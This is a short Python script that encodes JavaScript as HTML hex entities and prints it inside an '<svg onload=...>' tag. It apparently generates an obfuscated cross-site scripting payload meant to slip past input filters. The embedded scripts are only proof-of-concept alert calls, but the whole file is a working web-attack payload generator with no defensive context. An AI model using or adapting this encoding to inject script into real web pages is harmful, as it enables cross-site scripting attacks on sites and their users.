def hexpad(character):
	''' Return a padded hex encoding of an ascii character '''
	character = hex(ord(character))[2:]
	if len(character) == 1:
		return '0' + character
	return character

def html_entity_encode(string):
	''' Encode an ascii string as HTML entities '''
	return ''.join([f'&#x{hexpad(c)};' for c in string])

if __name__ == "__main__":
	str1 = "alert('1337')";
	str2 = "for (let i in [1,2,3]) alert(i);";
	encoded = html_entity_encode(str2)
	print(f"<svg onload={''.join(encoded)}>")
